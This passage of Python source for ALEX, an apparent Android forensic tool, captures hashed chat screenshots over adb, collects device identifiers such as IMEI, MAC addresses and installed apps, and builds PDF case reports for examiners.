            self.pdf_report(pdf_type="screenshot", shot=filename, sha256=hash_sha256, shot_png=filepath, app_name=app_name, chat_name=chat_name, w=wsize, h=hsize)
            self.shotloop(app_name, chat_name, ab_count, sc_count, abs_count, direction, imglabel, namefield, png=png, text=text, seen_hashes=seen_hashes, first_hash=first_hash, w=w, h=h)
        else:
            while not self.stop_event.is_set():
                if ab_count >= 3 or abs_count >= 6:
                    text.configure(text="Chat loop finished.")
                    self.upbutton.configure(state="enabled")
                    self.downbutton.configure(state="enabled")
                    self.abortbutton.configure(state="enabled")
                    self.stop_event.set()
                    return
                else:
                    prev = png
                    swipe_direction()
                    time.sleep(0.3)
                    try:
                        shot = device.screenshot(error_ok=False)
                        png_bytes = BytesIO()
                        shot.save(png_bytes, format="PNG")
                        png = png_bytes.getvalue()
                    except:
                        shotfail = True
                        shot_path = "/sdcard/alex_shot.png"
                        device.shell(f"screencap {shot_path}")
                        device.sync.pull(shot_path, filepath)
                        device.shell(f"rm {shot_path}")
                        shot = Image.open(filepath)
                        png_bytes = BytesIO()
                        shot.save(png_bytes, format="PNG")
                        png = png_bytes.getvalue()
                    l_hash = imagehash.phash(shot)
                    if png != prev:
                        duplicate = any(abs(l_hash - h) <= 3 for h in seen_hashes)
                        if not duplicate:
                            seen_hashes.append(l_hash)
                            hperc = (hsize/float(shot.size[1]))
                            wsize = int((float(shot.size[0])*float(hperc)))
                            if wsize > 300:
                                wsize = 300
                                wperc = (wsize/float(shot.size[0]))
                                hsize = int((float(shot.size[1])*float(wperc)))
                            screensh = ctk.CTkImage(dark_image=shot, size=(wsize, hsize))
                            imglabel.configure(image=screensh)
                            if shotfail == False:
                                with open(os.path.join(filepath), "wb") as file:
                                    file.write(png)
                                hash_sha256 = hashlib.sha256(png).hexdigest()
                            else:
                                hash_sha256 = hashlib.sha256(open(filepath, "rb").read()).hexdigest()
                            with open(os.path.join(hashpath), "w") as hash_file:
                                hash_file.write(hash_sha256)
                            log(f"Created screenshot {filename} with hash {hash_sha256}")
                            namefield.configure(text=f"Screenshot saved as:\n{filename}\nHash saved as:\n{hashname}")
                            self.pdf_report(pdf_type="screenshot", shot=filename, sha256=hash_sha256, shot_png=filepath, app_name=app_name, chat_name=chat_name, w=wsize, h=hsize)
                            sc_count += 1
                            ab_count = 0
                            abs_count = 0
                        else:
                            abs_count += 1
                            if sc_count > 2:
                                ab_count += 1
                            else:
                                pass
                    else:
                        abs_count += 1
                        if sc_count > 2:
                            ab_count += 1

                    if sc_count > 2 and abs(l_hash - first_hash) <= 2:
                            print("is first")
                            self.breakshotloop()
                    self.shotloop(app_name, chat_name, ab_count, sc_count, abs_count, direction, imglabel, namefield, png=png, text=text, seen_hashes=seen_hashes, first_hash=first_hash, w=w, h=h)
            text.configure(text="Chat loop stopped.")
            self.upbutton.configure(state="enabled")
            self.downbutton.configure(state="enabled")
            self.abortbutton.configure(state="enabled")
            #AccessibilityAudit(lockdown).set_show_visuals(False)
            raise SystemExit
            return("interrupt")

    def show_pdf_report(self):
        ctk.CTkLabel(self.dynamic_frame, text=f"ALEX by Christian Peter  -  Output: {dir_top}", text_color="#3f3f3f", height=60, padx=40, font=self.stfont).pack(anchor="w")
        ctk.CTkLabel(self.dynamic_frame, text="Generate PDF Report", height=60, width=585, font=("standard",24), justify="left").pack(pady=20)
        self.text = ctk.CTkLabel(self.dynamic_frame, text="Provide the case information:", width=585, height=30, font=self.stfont, anchor="w", justify="left")
        self.change = ctk.IntVar(self, 0)
        self.text.pack(anchor="center", pady=25)
        
        self.casebox = ctk.CTkEntry(self.dynamic_frame, width=360, height=20, corner_radius=0, placeholder_text="case number")
        self.casebox.pack(pady=5, padx=30)
        self.namebox = ctk.CTkEntry(self.dynamic_frame, width=360, height=20, corner_radius=0, placeholder_text="case name")
        self.namebox.pack(pady=5, padx=30)
        self.evidbox = ctk.CTkEntry(self.dynamic_frame, width=360, height=20, corner_radius=0, placeholder_text="evidence number")
        self.evidbox.pack(pady=5, padx=30)  
        self.exambox = ctk.CTkEntry(self.dynamic_frame, width=360, height=20, corner_radius=0, placeholder_text="examiner")
        self.exambox.pack(pady=5, padx=30) 
        self.okbutton = ctk.CTkButton(self.dynamic_frame, text="OK", font=self.stfont, command=lambda: self.change.set(1))
        self.okbutton.pack(pady=30, padx=100)
        global case_number
        global case_name
        global evidence_number
        global examiner
        if case_number != "":
                self.casebox.insert(0, string=case_number)
        else:
            pass
        if case_name != "":
                self.namebox.insert(0, string=case_name)
        else:
            pass
        if evidence_number != "":
                self.evidbox.insert(0, string=evidence_number)
        else:
            pass
        if examiner != "":
                self.exambox.insert(0, string=examiner)
        else:
            pass
        self.wait_variable(self.change)
        self.casebox.pack_forget()
        self.namebox.pack_forget()
        self.evidbox.pack_forget()
        self.exambox.pack_forget()
        self.okbutton.pack_forget()
        self.change.set(0)
        case_number = self.casebox.get()
        case_name = self.namebox.get()
        evidence_number = self.evidbox.get()
        examiner = self.exambox.get()
        start_pdf = threading.Thread(target=lambda: self.pdf_report(case_number, case_name, evidence_number, examiner, change=self.change))
        start_pdf.start()
        self.wait_variable(self.change)
        self.text.configure(text="PDF creation complete!", height=60)
        self.after(100, lambda: ctk.CTkButton(self.dynamic_frame, text="OK", font=self.stfont, command=lambda: self.switch_menu("ReportMenu")).pack(pady=40))

    #PDF Device Report with pdfme
    def pdf_report(self, case_number="", case_name="", evidence_number="", examiner="", pdf_type="default", shot="none", sha256="none", shot_png="none", app_name=None, chat_name=None, w=None, h=None, change=None,):
        if change != None:
            self.text.configure(text="Creating PDF-Report. Please wait.")
            self.prog_text = ctk.CTkLabel(self.dynamic_frame, text="0%", width=585, height=20, font=self.stfont, anchor="w", justify="left")
            self.prog_text.pack()
            self.progress = ctk.CTkProgressBar(self.dynamic_frame, width=585, height=30, corner_radius=0)
            self.progress.set(0)
            self.prog_text.configure(text="0%")
            self.progress.pack()
            apps_info = []
            i = 0
            if ut == False:
                for d_app in apps:
                    i+=1
                    progr = 100/len(apps)*i
                    app_name = d_app[0][:42]
                    app_version = device.app_info(d_app[0]).version_name[:28]
                    app_installer = "packageinstaller" if "packageinstaller" in d_app[1] else d_app[1][:25]
                    apps_info.append([app_name, app_version, app_installer])
                    self.prog_text.configure(text=f"{int(100/len(apps)*i)}%")
                    self.progress.set(progr/100) 
            else:
                apps_info = apps       

        u_grey = [0.970, 0.970, 0.970]
        #background_color = tuple(int(c * 255) for c in u_grey)
        font_size = 64
        font_path = os.path.join(os.path.dirname(__file__),"assets", "report", "texgyreheros-regular.otf")
        font = ImageFont.truetype(font_path, font_size)
        dummy_image = Image.new("RGB", (1, 1))
        draw = ImageDraw.Draw(dummy_image)
        text_width = 2400
        image = Image.new("RGB", (int(text_width), font_size+8), 'white')
        draw = ImageDraw.Draw(image)
        draw.text((0,-16),text=d_name, font=font, fill="black")
        image_stream = BytesIO()
        image.save(image_stream, format="JPEG", quality=95)
        image_stream.seek(0)
        if h == 426:
            lr_width = (1.4 * (185/w))    
        else:
            lr_width = 0.5
        if app_name != None:
            app_name = f'{app_name} (Named by examiner)'
        if chat_name != None:
            chat_name = f'{chat_name} (Named by examiner)'

        with tempfile.NamedTemporaryFile(delete=False, suffix='.jpg') as temp_file:
            temp_file.write(image_stream.getvalue())
            temp_image_name = temp_file.name

        if ut == True:
            d_image = os.path.join(os.path.dirname(__file__), "assets" , "report", "ut_generic.jpg")
        elif aos == True:
            d_image = os.path.join(os.path.dirname(__file__), "assets" , "report", "asteroidos.jpg")
        else:
            d_image = os.path.join(os.path.dirname(__file__), "assets" , "report", "generic.jpg")
 
        if pdf_type == "screenshot":
            document = {
                "style": {"margin_bottom": 15, "text_align": "j", "page_size": "a4", "margin": [52, 70]},
                "formats": {
                    "url": {"c": "blue", "u": 1}, "title": {"b": 1, "s": 13}},
                "running_sections": {
                    "header": {
                        "x": "left", "y": 20, "height": "top", "style": {"text_align": "r"}, "content": [{".b": "Device Report - Generated by ALEX"}]},
                    "footer": {
                        "x": "left", "y": 800, "height": "bottom", "style": {"text_align": "c"}, "content": [{".": ["Page ", {"var": "$page"}]}]}
                },
                "sections": [
                    {
                        "style": {"page_numbering_style": "arabic"},
                        "running_sections": ["footer"],
                        "content": [
                            {
                                "widths": [0.8, 0.1, 8.5],
                                "style": {"s": 10, "border_color": "white",},
                                "table": [

                                    [
                                        {"image": os.path.join(os.path.dirname(__file__), "assets" , "report", "report_a.jpg")}, None,
                                        {".": [{".b;s:18": "ALEX Screenshot Report" + "\n"}, f"Created with ALEX {a_version}"]}
                                    ]
                                ]
                            },
                            {".": "Device:", "style": "title", "label": "title2", "outline": {}},
                            {
                                "widths": [1.2, 2.5, 1.8, 2.5],
                                "style": {"s": 10, "border_color": "lightgrey"},
                                "table": [
                                    [{".": [{".b": "Dev-Name:"}]}, {"colspan": 3, "image": temp_image_name}, None, None],
                                    [{"style": {"border_color": "white", "cell_fill": u_grey}, ".": [{".b": "Model-Nr:"}]}, {"colspan": 3, "style": {"cell_fill": u_grey}, ".": [{".": full_name.title()}]}, None, None],
                                    [{".": [{".b": "SerialNr:"}]}, {"colspan": 3, ".": [{".": snr}]}, None, None],
                                ]
                            },
                            {".": "Screenshot:", "style": "title", "label": "title2", "outline": {}},
                            {
                                "widths": [1.2, 2.5, 1.8, 2.5],
                                "style": {"s": 10, "border_color": "lightgrey"},
                                "table": [
                                    [{".": [{".b": "Name:"}]}, {"colspan": 3, ".": [{".": shot}]}, None, None],
                                    [{"style": {"border_color": "white", "cell_fill": u_grey}, ".": [{".b": "SHA256:"}]}, {"colspan": 3, "style": {"cell_fill": u_grey}, ".": [{".": sha256}]}, None, None],
                                ]
                            },
                            {
                                "widths": [1.2, 2.5, 1.8, 2.5],
                                "style": {"s": 10, "border_color": "lightgrey"},
                                "table": [
                                    [{".": [{".b": "App:"}]}, {"colspan": 3, ".": [{".": app_name}]}, None, None],
                                    [{"style": {"border_color": "white", "cell_fill": u_grey}, ".": [{".b": "Chat:"}]}, {"colspan": 3, "style": {"cell_fill": u_grey}, ".": [{".": chat_name}]}, None, None],
                                ]
                            } if app_name is not None else "",
                            {
                                "widths": [lr_width, 2, lr_width],
                                "style": {"s": 10, "border_color": "white"},
                                "table": [
                                    [None, {"image": shot_png, "min_height":300}, None],
                                ]

                            },
                            ]
                            },
                            #{".": "", "style": "title", "label": "title0", "outline": {}},
            ]
        }
        else:
            document = {
                "style": {"margin_bottom": 15, "text_align": "j", "page_size": "a4", "margin": [52, 70]},
                "formats": {
                    "url": {"c": "blue", "u": 1}, "title": {"b": 1, "s": 13}},
                "running_sections": {
                    "header": {
                        "x": "left", "y": 20, "height": "top", "style": {"text_align": "r"}, "content": [{".b": "Device Report - Generated by ALEX"}]},
                    "footer": {
                        "x": "left", "y": 800, "height": "bottom", "style": {"text_align": "c"}, "content": [{".": ["Page ", {"var": "$page"}]}]}
                },
                "sections": [
                    {
                        "style": {"page_numbering_style": "arabic"},
                        "running_sections": ["footer"],
                        "content": [

                            {
                                "widths": [0.8, 0.1, 8.5],
                                "style": {"s": 10, "border_color": "white",},
                                "table": [
                                    [
                                        {"image": os.path.join(os.path.dirname(__file__), "assets" , "report", "report_a.jpg")}, None,
                                        {".": [{".b;s:18": "ALEX Device Report" + "\n"}, f"Created with ALEX {a_version}"]}
                                    ]
                                ]
                            },
                            {".": ""},{".": ""},
                            {".": "Case Information:", "style": "title", "label": "title1", "outline": {}},
                            {
                                "widths": [1.8, 0.5, 2.5, 5],
                                "style": {"s": 10, "border_color": "white",},
                                "table": [
                                    [{"rowspan": 4, "image": d_image}, None, {".": [{".b": "Case Number:"}]}, {".": [{".": case_number}]}],
                                    [None, None, {".": [{".b": "Case Name:"}]}, {".": [{".": case_name}]}],
                                    [None, None, {".": [{".b": "Evidence Number:"}]}, {".": [{".": evidence_number}]}],
                                    [None, None, {".": [{".b": "Examiner:"}]}, {".": [{".": examiner}]}]
                                ]
                            },
                            {".": "",},
                            {".": "Device Information:", "style": "title", "label": "title2", "outline": {}},
                            {
                                "widths": [1.2, 2.5, 1.2, 3.1],
                                "style": {"s": 10, "border_color": "lightgrey"},
                                "table": [
                                    [{".": [{".b": "Dev-Name:"}]}, {"colspan": 3, "image": temp_image_name}, None, None],
                                    [{"style": {"border_color": "white", "cell_fill": u_grey}, ".": [{".b": "Model-Nr:"}]}, {"colspan": 3, "style": {"cell_fill": u_grey}, ".": [{".": full_name.title()}]}, None, None],
                                    [{".": [{".b": "Product:"}]}, {"colspan": 3, ".": [{".": product}]}, None, None],
                                    [{"style": {"cell_fill": u_grey}, ".": [{".b": "Platform:"}]}, {"style": {"cell_fill": u_grey}, ".": [{".": d_platform}]}, { "style": {"cell_fill": u_grey}, ".": [{".b": "WiFi MAC:"}]}, {"style": {"cell_fill": u_grey}, ".": [{".": w_mac}]}],
                                    [{".": [{".b": "Software:"}]}, {".": [{".": software}]}, {".": [{".b": "BT MAC:"}]}, {".": [{".": b_mac}]}],
                                    [{"style": {"cell_fill": u_grey}, ".": [{".b": "Build Nr:"}]}, {"style": {"cell_fill": u_grey}, ".": [{".": build[:22]}]}, {"style": {"cell_fill": u_grey}, ".": [{".b": "Data:"}]}, {"style": {"cell_fill": u_grey}, ".": [{".": data_s}]}],
                                    [{".": [{".b": "SPL:"}]}, {".": [{".": spl}]}, {".": [{".b": "Free Space:"}]}, {".": [{".": free}]}],
                                    [{"style": {"cell_fill": u_grey}, ".": [{".b": "Language:"}]}, {"style": {"cell_fill": u_grey}, ".": [{".": locale}]}, {"style": {"cell_fill": u_grey}, ".": [{".b": "Used:"}]}, {"style": {"cell_fill": u_grey}, ".": [{".": used_s}]}],
                                    [{".": [{".b": "AD-ID:"}]}, {".": [{".": ad_id}]}, {".": [{".b": "Used %:"}]}, {".": [{".": use_percent}]}],
                                    [{"style": {"cell_fill": u_grey}, ".": [{".b": "Encryption:"}]}, {"style": {"cell_fill": u_grey}, ".": [{".": f"{crypt_on} {crypt_type}"}]}, {"style": {"cell_fill": u_grey}, ".": [{".b": "IMEI:"}]}, {"style": {"cell_fill": u_grey}, ".": [{".": imei}]}]
                                ]

                            },
                            {".": "",},
                
                            {
                                ".": "Applications:", "style": "title", "label": "title1", "outline": {}
                            },
                            
                            {
                                "widths": [3.9, 2.8, 2.5],
                                "style": {"s": 9, "border_color": "white", "margin_bottom": 2},
                                "table": [
                                    [{".": [{".b":"App"}]},{".": [{".b":"Version"}]},{".":[{".b":"Source"}]}]
                                ]
                            },

                            *[
                                {
                                "widths": [3.9, 2.8, 2.5],
                                "style": {"s": 9, "border_color": "lightgrey"},
                                "table": [
                                    [{"style": {"cell_fill": u_grey if (apps_info.index(d_app) % 2) != 0 else "white"},".": d_app[0]}, {"style": {"cell_fill": u_grey if (apps_info.index(d_app) % 2) != 0 else "white"},".": d_app[1]}, 
                                    {"style": {"cell_fill": u_grey if (apps_info.index(d_app) % 2) != 0 else "white"},".": d_app[2]}] for d_app in apps_info]
                                } if len(apps_info) > 0 else " "],              

                            {".": "", "style": "title", "label": "title0", "outline": {}},
                        ] 

                    },
                ]
            }
        if pdf_type == "screenshot":
            screen_pdf_path = os.path.splitext(shot_png)[0]+'.pdf'
            with open(screen_pdf_path, 'wb') as f:
                build_pdf(document, f)
        else:
            log("Created PDF Report")
            with open(f'Report_{snr}.pdf', 'wb') as f:
                build_pdf(document, f)
            self.progress.pack_forget()
            self.prog_text.pack_forget()
        
        
        if change != None:
            change.set(1)


a_version = 0.2
default_host = "127.0.0.1"
default_port = 5037

def _adb_serve_running():
    s = socket.socket()
    try:
        s.connect(("127.0.0.1", 5037))
        s.close()
        return True
    except OSError:
        return False

def ensure_adb_server(timeout=10):
    if _adb_serve_running():
        return True

    adb_path = shutil.which("adb")
    if not adb_path:
        raise RuntimeError("adb not found.")

    subprocess.Popen([adb_path, "start-server"],
                     stdout=subprocess.DEVNULL,
                     stderr=subprocess.DEVNULL)
    
    deadline = time.time() + timeout
    while time.time() < deadline:
        if _adb_serve_running():
            return True
        time.sleep(0.5)

def add_space(value: str) -> str:
        if value and value[-1].isalpha():
            return value[:-1] + " " + value[-1]
        return value

def getprop(device, key):
    value = device.shell(f"getprop {key}").strip()
    return value if value else "-"

def to_mb(text: str) -> float:
    num_match = re.compile(r"\d+(\.\d+)?")
    m = num_match.search(text)
    if not m:
        return 0.0
    val = float(m.group())
    if "G" in text:
        return val * 1024
    elif "K" in text:
        return val / 1024
    else:
        return val

def get_client(host=default_host, port=default_port, check=False):
    global adb
    global snr_id
    global snr
    global device
    global device_info
    global state
    global paired
    global apps
    global ut
    global aos
    try:
        ensure_adb_server()
        adb = adbutils.AdbClient(host=host, port=port)
    except Exception:
        adb = None

    if adb != None:
        try:
            snr_id = adb.list(extended=True)[0].serial
            state = adb.list(extended=True)[0].state
            device = adb.device(snr_id)
        except IndexError:
            snr = None
            state = None
            device = None
        if check == True:
            return adb
        if device == None:
            device_info = nodevice_text = ("No device detected!\n" +
                    "\n" + '{:13}'.format("Python: ") + "\t" + platform.python_version() +
                    "\n" + '{:13}'.format("adbutils: ") + "\t" + version('adbutils') +
                    "\n\n" + 
                    "   54 68 65 20 52 6f 61 64 20 67 6f \n" +
                    "   65 73 20 65 76 65 72 20 6f 6e 20 \n" +
                    "   61 6e 64 20 6f 6e 0a 44 6f 77 6e \n" +
                    "   20 66 72 6f 6d 20 74 68 65 20 64 \n" +
                    "   6f 6f 72 20 77 68 65 72 65 20 69 \n" + 
                    "   74 20 62 65 67 61 6e 2e 0a 4e 6f \n" +
                    "   77 20 66 61 72 20 61 68 65 61 64 \n" + 
                    "   20 74 68 65 20 52 6f 61 64 20 68 \n" +
                    "   61 73 20 67 6f 6e 65 2c 0a 41 6e \n" +
                    "   64 20 49 20 6d 75 73 74 20 66 6f \n" +
                    "   6c 6c 6f 77 2c 20 69 66 20 49 20 \n" +
                    "   63 61 6e 2e")
        elif state == "unauthorized":
            dev_state = "unauthorized ✗"
            device_info = ("Device is " + dev_state + "\n\n" +
                    '{:13}'.format("Serialnr: ") + "\t" + snr_id + "" +
                    "\n\n" + 
                    "   4E 4F 20 41 44 4D 49 54 54 41 4E \n" +
                    "   43 45 20 45 58 43 45 50 54 20 4F \n" +
                    "   4E 20 50 41 52 54 59 20 42 55 53 \n" +
                    "   49 4E 45 53 53 2E")
        else:
            paired = True
            global whoami
            whoami = device.shell("whoami 2>/dev/null")
            osr = device.shell("cat /etc/os-release")
            if whoami == "phablet":
                ut = True
            else:
                ut = False
            if "asteroidos" in osr.lower():
                aos = True
            else:
                aos = False
            dev_state = "authorized ✔"
            snr = getprop(device, "ro.serialno")
            global brand
            global model
            brand = getprop(device, "ro.product.brand").capitalize()
            model = getprop(device, "ro.product.model").capitalize()
            global full_name   
            full_name = f"{brand} {model}" if brand not in model else model
            global product 
            product = getprop(device, "ro.product.name").capitalize()
            global d_platform 
            d_platform = getprop(device, "ro.board.platform").upper()
            global software
            software = getprop(device, "ro.build.version.release")
            global sdk
            sdk = getprop(device, "ro.build.version.sdk")
            global build
            build = getprop(device, "ro.build.display.id").split(" ")[0]
            global spl
            spl = getprop(device, "ro.build.version.security_patch")
            global locale
            locale = getprop(device, "persist.sys.locale")
            if locale == "-" and whoami == "phablet":
                locale = device.shell("echo $LANG")
            global imei
            imei = getprop(device, 'gsm.baseband.imei').replace("'","")
            if imei == "-":
                if whoami == "phablet":
                    imei_cmd = device.shell('dbus-send --system --print-reply --dest=org.ofono /ril_0 org.ofono.Modem.GetProperties')
                    match = re.search(r'"(\d{14,17})"', imei_cmd)
                    if match:
                        imei = match.group(1)
                    else:
                        imei = "-"
                else:
                    imei = getprop(device, 'ro.gsm.imei').replace("'","")
            if imei == "-":
                imei = getprop(device, 'ril.imei').replace("'","")
            if imei == "-":
                dump_imei = device.shell("dumpsys iphonesubinfo")
                match = re.search(r"Device ID\s*=\s*(\d+)", dump_imei)
                if match:
                    imei = match.group(1)
                else:
                    imei = "-"
            if imei == "-":
                major_ver = int(software.split(".")[0])
                if major_ver < 5:
                    pass
                else:
                    imei = device.shell("service call iphonesubinfo 1 s16 com.android.shell | cut -c 52-66 | tr -d '.[:space:]'").replace("'","")
            if "not found" in imei or "service" in imei or "000000" in imei:
                imei = "-"
            global b_mac
            b_mac = device.shell("settings get secure bluetooth_address")
            if b_mac == "":
                b_mac = "-"
            if "not found" in b_mac:
                b_mac = "-"
            if b_mac == "-":
                if whoami == "phablet" or aos == True:
                    b_mac = device.shell(f"busctl --system get-property org.bluez /org/bluez/hci0 org.bluez.Adapter1 Address | tr -d 's\" '")
            global w_mac
            w_mac = getprop(device, "ro.boot.wifimacaddr")
            if w_mac == "-":
                if whoami == "phablet":
                    w_mac = device.shell("cat /sys/class/net/wlan0/address")
                    if "No such file" in w_mac:
                        w_mac = "-"
                    else:
                        w_mac = w_mac.upper()
                else:
                    wifi_dump = device.shell("dumpsys wifi")
                    match1 = re.search(r"wifi_sta_factory_mac_address=([0-9a-fA-F:]{17})", wifi_dump)
                    match2 = re.search(r" MAC:\s*([0-9a-fA-F:]{17})", wifi_dump)      
                    if match1:
                        w_mac = match1.group(1).upper()
                    elif match2:
                        w_mac = match2.group(1).upper()
                    else:
                        w_mac = "-"
                    if "00:00:00" in w_mac:
                        w_mac = "-"
                    if w_mac == "-":
                        w_mac = device.shell("ip addr show wlan0 | grep 'link/ether' | awk '{print $2}'").upper()
            global d_name
            d_name = device.shell("settings get global device_name")
            if d_name == "":
                d_name = "-"
                name_s = d_name
            if "not found" in d_name:
                d_name = "-"
                name_s = d_name
            if d_name == "-":
                if whoami == "phablet" or aos == True:
                    d_name = device.shell("hostname")
            if len(d_name) > 26:
                wordnames = d_name.split()
                if len(' '.join(wordnames[:-1])) < 27:
                    name_s = ' '.join(wordnames[:-1]) + "\n" + '{:13}'.format(" ") + "\t" + wordnames[-1]
                else:
                    name_s = ' '.join(wordnames[:-2]) + "\n" + '{:13}'.format(" ") + "\t" + ' '.join(wordnames[-2:])
            else:
                name_s = d_name
            global fname_s
            if len(full_name) > 26:
                wordnames = full_name.split()
                if len(' '.join(wordnames[:-1])) < 27:
                    fname_s = (' '.join(wordnames[:-1]) + "\n" + '{:13}'.format(" ") + "\t" + wordnames[-1]).title()
                else:
                    fname_s = (' '.join(wordnames[:-2]) + "\n" + '{:13}'.format(" ") + "\t" + ' '.join(wordnames[-2:])).title()
            else:
                fname_s = full_name.title()
            global data_s
            global used
            global used_s
            global free
            global use_percent
            old_dev = False
            if aos == True:
                data_dev = ""
            else:
                data_dev =  "data"
            data_df = device.shell(f"df -h /{data_dev}")
            if "-h" in data_df.lower():
                old_dev = True
                data_df = device.shell("df /data")
            data_lines = data_df.strip().splitlines()
            if len(data_lines) >= 2 and "can't find mount point" not in data_df:
                data_line = data_lines[1]
                try:
                    parts = re.split(r"\s+", data_line)
                    size, used, avail, use_percent = parts[1:5]
                except:
                    data_line = data_lines[2]
                    parts = re.split(r"\s+", data_line)
                    size, used, avail, use_percent = parts[1:5]
                try:
                    data_s = f"{add_space(size)}B"
                    used_s = f"{add_space(used)}B"
                    free = f"{add_space(avail)}B"
                except:
                    data_s, used_s, free, use_percent = "-", "-", "-", "-"
                if old_dev == False:
                    try: graph_progress = "" + "▓" * int(26/100*int(use_percent.rstrip("%"))) + "░" * int(26/100*(100-int(use_percent.rstrip("%")))) + ""
                    except: graph_progress = "-"
                else:
                    try:
                        used_g = to_mb(used)
                        free_g = to_mb(avail)
                        use_percent = int(used_g * 100 / (used_g + free_g))
                        graph_progress = "" + "▓" * int(26/100*use_percent) + "░" * int(26/100*(100-use_percent)) + ""
                    except: graph_progress = "-"
            else:
                data_s, used_s, free, use_percent = "-", "-", "-", "-"
                graph_progress = "-"
            global ad_id
            ad_id = device.shell("settings get secure android_id")
            if "not found" in ad_id:
                ad_id = "-"
            if ad_id == "":
                ad_id = "-"
            global crypt_on
            global crypt_type
            crypt_on = getprop(device, "ro.crypto.state")
            crypt_type = getprop(device, "ro.crypto.type")
            if crypt_type not in ["", "-"]:
                crypt_type = f"({crypt_type})"
            else:
                crypt_type = ""

            global apps
            global all_apps
            global su_app
            su_app = None
            su_apps = [".supersu", ".magisk", ".su", ".superuser", ".kinguser", ".kernelsu"]
            if whoami != "phablet":
                all_app_query = device.shell("pm list packages")
                all_apps = [line.replace("package:", "") for line in all_app_query.splitlines() if line.strip()]
                app_query = device.shell("pm list packages -3 -i")
                pattern = re.compile(r"package:([^\s]+)\s+installer=([^\s]+)")
                apps = [[pkg, installer] for pkg, installer in pattern.findall(app_query)]

                su_app = next(
                    (pkg for pkg, installer in apps if pkg.endswith(tuple(su_apps))),
                    None
                )

                if su_app:
                    print("Found:", su_app)

            else:
                app_cmd = device.shell("click list")
                apps = []
                for line in app_cmd.splitlines():
                    parts = line.split()
                    if len(parts) >= 2:
                        name = parts[0].strip()
                        app_version = parts[1].strip()
                        apps.append([name, app_version, "click"])

            global apps_path
            apps_path = []
            apps_path_query = device.shell("pm list packages -f -3")
            for line in apps_path_query.splitlines():
                match = re.match(r"package:(.+)/base\.apk=.*", line)
                if match:
                    app_path = match.group(1)
                    apps_path.append(app_path)


            if len(build) > 26:
                build_s = build[:25] + "\n" + '{:13}'.format(" ") + "\t" + build[25:]
            else:
                build_s = build
            global recovery
            global rec_root
            recovery = False
            rec_root = False
            if state == "recovery":
                recovery = True
                if device.shell("whoami") == "root":
                    rec_root = True
                device_info = ("Device is in recovery mode" + "\n\n" +
                    '{:13}'.format("Model: ") + "\t" + fname_s +
                    "\n" + '{:13}'.format("Name: ") + "\t" + name_s +
                    "\n" + '{:13}'.format("Product: ") + "\t" + product +
                    "\n" + '{:13}'.format("Platform: ") + "\t" + d_platform +
                    "\n" + '{:13}'.format("Software: ") + "\t" + software +
                    "\n" + '{:13}'.format("Build-Nr: ") + "\t" + build_s +
                    "\n" + '{:13}'.format("SPL: ") + "\t" + spl +
                    "\n" + '{:13}'.format("Language: ") + "\t" + locale +
                    "\n" + '{:13}'.format("Serialnr: ") + "\t" + snr +
                    "\n" + '{:13}'.format("IMEI: ") + "\t" + imei +
                    "\n" + '{:13}'.format("Disk Use: ") + "\t" + graph_progress +
                    "\n" + '{:13}'.format("Data: ") + "\t" + data_s +
                    "\n" + '{:13}'.format("Used: ") + "\t" + used_s +
                    "\n" + '{:13}'.format("Free: ") + "\t" + free +
                    "\n" + '{:13}'.format("Ad-ID: ") + "\t" + ad_id +
                    "\n" + '{:13}'.format("State: ") + "\t" + crypt_on + " " + crypt_type)   
            else:
                device_info = ("Device is " + dev_state + "\n\n" +
                        '{:13}'.format("Model: ") + "\t" + fname_s +
                        "\n" + '{:13}'.format("Name: ") + "\t" + name_s +
                        "\n" + '{:13}'.format("Product: ") + "\t" + product +
                        "\n" + '{:13}'.format("Platform: ") + "\t" + d_platform +
                        "\n" + '{:13}'.format("Software: ") + "\t" + software +
                        "\n" + '{:13}'.format("Build-Nr: ") + "\t" + build_s +
                        "\n" + '{:13}'.format("SPL: ") + "\t" + spl +
                        "\n" + '{:13}'.format("Language: ") + "\t" + locale +
                        "\n" + '{:13}'.format("Serialnr: ") + "\t" + snr +
                        "\n" + '{:13}'.format("IMEI: ") + "\t" + imei +
                        "\n" + '{:13}'.format("Wifi MAC: ") + "\t" + w_mac +
                        "\n" + '{:13}'.format("BT MAC: ") + "\t" + b_mac +
                        "\n" + '{:13}'.format("Disk Use: ") + "\t" + graph_progress +
                        "\n" + '{:13}'.format("Data: ") + "\t" + data_s +
                        "\n" + '{:13}'.format("Used: ") + "\t" + used_s +
                        "\n" + '{:13}'.format("Free: ") + "\t" + free +
                        "\n" + '{:13}'.format("Ad-ID: ") + "\t" + ad_id +
                        "\n" + '{:13}'.format("State: ") + "\t" + crypt_on + " " + crypt_type)
                
                if su_app != None:
                    device_info = device_info + "\n" + '{:13}'.format("root: ") + "\t" + "su manager found"


    else:
        device = None
        state = None
        device_info = ("ADB not found!\n" +
        "\n" + '{:13}'.format("Python: ") + "\t" + platform.python_version() +
        "\n" + '{:13}'.format("adbutils: ") + "\t" + version('adbutils') +
        "\n\n" + 
        "   54 68 65 20 52 6f 61 64 20 67 6f \n" +
        "   65 73 20 65 76 65 72 20 6f 6e 20 \n" +
        "   61 6e 64 20 6f 6e 0a 44 6f 77 6e \n" +
        "   20 66 72 6f 6d 20 74 68 65 20 64 \n" +
        "   6f 6f 72 20 77 68 65 72 65 20 69 \n" + 
        "   74 20 62 65 67 61 6e 2e 0a 4e 6f \n" +
        "   77 20 66 61 72 20 61 68 65 61 64 \n" + 
        "   20 74 68 65 20 52 6f 61 64 20 68 \n" +
        "   61 73 20 67 6f 6e 65 2c 0a 41 6e \n" +
        "   64 20 49 20 6d 75 73 74 20 66 6f \n" +
        "   6c 6c 6f 77 2c 20 69 66 20 49 20 \n" +
        "   63 61 6e 2e")
    return adb

def save_info_json(zip_path, change):
    device_info_alex = [
        {"_comment": f"This data was generated from ADB live commands using ALEX version {a_version}"},
        {"Brand": brand},
        {"Model": model},
        {"Name": product},
        {"Platform": d_platform},
        {"Software": software},
        {"SDK": sdk},
        {"SPL": spl},
        {"Build": build},
        {"Locale": locale},
        {"Serialnumber": snr_id},
        {"IMEI": imei},
        {"WiFi MAC": w_mac},
        {"Bluetooth MAC": b_mac},
        {"Data size": data_s},
        {"Encryption state": crypt_on},
        {"Encryption type": crypt_type}
    ]

    json_data = json.dumps(device_info_alex, ensure_ascii=False, indent=2)

    zip_path.writestr("device_info_alex.json", json_data)
    change.set(1)


def save_info():
    file = open("device_" + snr + ".txt", "w", encoding='utf-8')
    file.write("## DEVICE ##\n\n" + "Model-Nr:   " + full_name.title() + "\nDev-Name:   " + d_name + "\nProduct:    " + product + 
